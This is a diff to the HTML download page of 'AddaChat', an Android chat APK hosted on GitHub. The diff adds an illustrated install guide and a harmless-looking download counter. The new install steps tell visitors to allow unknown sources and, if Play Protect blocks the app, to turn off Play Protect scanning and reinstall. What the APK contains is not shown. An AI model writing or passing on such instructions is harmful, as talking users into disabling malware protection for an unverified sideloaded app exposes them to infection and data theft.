@@ -48,6 +48,12 @@
   .dot { width: 13px; height: 13px; border-radius: 50%; flex: none; }
   .steps p { color: #c8d0d4; font-size: 15px; line-height: 1.55; padding: 4px 0; }
   .steps .sub { padding-left: 22px; color: #8696a0; font-size: 14px; }
+  .dlcount { color: #00d4aa; font-weight: 700; font-size: 15px; margin-top: 12px; }
+  .guide { width: 100%; height: auto; margin: 4px 0 12px; }
+  .pp { background: #182229; border-radius: 14px; padding: 14px 16px; margin-top: 14px; }
+  .pp h3 { font-size: 16px; color: #ffb3b3; margin-bottom: 8px; }
+  .pp p { font-size: 14px; }
+  .pp .note { color: #78c8a0; font-size: 13px; margin-top: 8px; }
   footer { margin-top: 34px; text-align: center; color: #8696a0; font-size: 14px; line-height: 1.7; }
   footer .dim { color: #5d6d75; font-size: 13px; }
 </style>
@@ -80,6 +86,7 @@
   </a>
   <p class="safe">100% Free &nbsp;&bull;&nbsp; No ads &nbsp;&bull;&nbsp; Safe</p>
   <p class="fallback">Trouble downloading? <a href="https://github.com/obujphki11-ux/addachat/blob/main/chat-to-friends%20(6).apk">View the file on GitHub</a></p>
+  <p class="dlcount" id="dlcount" style="display:none">&#11015; <span id="dlnum">0</span> downloads</p>
 
   <div class="card">
     <h2>What's inside</h2>
@@ -90,16 +97,72 @@
   </div>
 
   <div class="card steps">
-    <h2>How to install</h2>
-    <p>1.&nbsp; Tap Download — the APK file will save</p>
-    <p>2.&nbsp; Open the file and tap Install</p>
-    <p class="sub">(allow 'unknown apps' if asked)</p>
-    <p>3.&nbsp; Sign in with Google and start chatting</p>
+    <h2>How to install — step by step</h2>
+    <svg class="guide" viewBox="0 0 520 158" role="img" aria-label="Install steps">
+      <g font-family="Segoe UI, Roboto, sans-serif">
+        <rect x="2" y="6" width="98" height="146" rx="14" fill="#182229"/>
+        <circle cx="24" cy="28" r="12" fill="#00a884"/><text x="24" y="33" font-size="13" font-weight="700" fill="#fff" text-anchor="middle">1</text>
+        <path d="M51 44v26M39 60l12 12 12-12M36 84h30" stroke="#25d366" stroke-width="5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+        <text x="51" y="112" font-size="12.5" fill="#e9edef" text-anchor="middle">Tap</text>
+        <text x="51" y="130" font-size="12.5" fill="#e9edef" text-anchor="middle">Download</text>
+        <rect x="106" y="6" width="98" height="146" rx="14" fill="#182229"/>
+        <circle cx="128" cy="28" r="12" fill="#00a884"/><text x="128" y="33" font-size="13" font-weight="700" fill="#fff" text-anchor="middle">2</text>
+        <rect x="136" y="44" width="38" height="48" rx="5" fill="none" stroke="#e9edef" stroke-width="3.5"/>
+        <text x="155" y="73" font-size="12" font-weight="700" fill="#25d366" text-anchor="middle">APK</text>
+        <text x="155" y="112" font-size="12.5" fill="#e9edef" text-anchor="middle">Open the</text>
+        <text x="155" y="130" font-size="12.5" fill="#e9edef" text-anchor="middle">file</text>
+        <rect x="210" y="6" width="98" height="146" rx="14" fill="#182229"/>
+        <circle cx="232" cy="28" r="12" fill="#00a884"/><text x="232" y="33" font-size="13" font-weight="700" fill="#fff" text-anchor="middle">3</text>
+        <rect x="228" y="56" width="62" height="30" rx="15" fill="#00a884"/>
+        <circle cx="272" cy="71" r="11" fill="#fff"/>
+        <text x="259" y="112" font-size="12.5" fill="#e9edef" text-anchor="middle">Allow</text>
+        <text x="259" y="130" font-size="12.5" fill="#e9edef" text-anchor="middle">install</text>
+        <rect x="314" y="6" width="98" height="146" rx="14" fill="#182229"/>
+        <circle cx="336" cy="28" r="12" fill="#00a884"/><text x="336" y="33" font-size="13" font-weight="700" fill="#fff" text-anchor="middle">4</text>
+        <path d="M363 42l20 8v16c0 14-8.5 22-20 28-11.5-6-20-14-20-28V50z" fill="none" stroke="#25d366" stroke-width="4"/>
+        <path d="M353 66l7 8 14-16" stroke="#25d366" stroke-width="4.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+        <text x="363" y="112" font-size="12.5" fill="#e9edef" text-anchor="middle">Play Protect</text>
+        <text x="363" y="130" font-size="12.5" fill="#e9edef" text-anchor="middle">(see below)</text>
+        <rect x="418" y="6" width="98" height="146" rx="14" fill="#182229"/>
+        <circle cx="440" cy="28" r="12" fill="#00a884"/><text x="440" y="33" font-size="13" font-weight="700" fill="#fff" text-anchor="middle">5</text>
+        <circle cx="467" cy="66" r="24" fill="none" stroke="#00a884" stroke-width="4"/>
+        <path d="M454 66l9 10 18-20" stroke="#25d366" stroke-width="5.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+        <text x="467" y="112" font-size="12.5" fill="#e9edef" text-anchor="middle">Install &amp;</text>
+        <text x="467" y="130" font-size="12.5" fill="#e9edef" text-anchor="middle">sign in</text>
+      </g>
+    </svg>
+    <p>1.&nbsp; Tap the green Download button — the APK file will save</p>
+    <p>2.&nbsp; Open the downloaded file (notification or Downloads folder)</p>
+    <p>3.&nbsp; If asked, Allow installs from this source</p>
+    <p>4.&nbsp; If Play Protect appears, follow the box below</p>
+    <p>5.&nbsp; Tap Install, then Open and sign in with Google</p>
+    <div class="pp">
+      <h3>If Play Protect stops the install</h3>
+      <p>1.&nbsp; Open the Play Store and tap your profile photo (top right)</p>
+      <p>2.&nbsp; Tap Play Protect, then the gear icon (top right)</p>
+      <p>3.&nbsp; Turn OFF "Scan apps with Play Protect" and tap Turn off</p>
+      <p>4.&nbsp; Come back and install AddaChat again</p>
+      <p class="note">You can turn the scan back on after installing.</p>
+    </div>
   </div>
 
   <footer>
     Created by: Naim Bhai<br>
     <span class="dim">&copy; 2026 AddaChat</span>
   </footer>
+  <script>
+  (function () {
+    var NS = 'JTBAWHCECutrB-Yn', KEY = 'guTP3FTqov--5ara';
+    var box = document.getElementById('dlcount'), num = document.getElementById('dlnum');
+    function show(v) { if (typeof v === 'number') { num.textContent = v; box.style.display = 'block'; } }
+    fetch('https://abacus.jasoncameron.dev/get/' + NS + '/' + KEY)
+      .then(function (r) { return r.json(); }).then(function (j) { show(j.value); }).catch(function () {});
+    var btn = document.querySelector('.btn');
+    if (btn) btn.addEventListener('click', function () {
+      fetch('https://abacus.jasoncameron.dev/hit/' + NS + '/' + KEY, { keepalive: true })
+        .then(function (r) { return r.json(); }).then(function (j) { show(j.value); }).catch(function () {});
+    });
+  })();
+  </script>
 </body>
 </html>
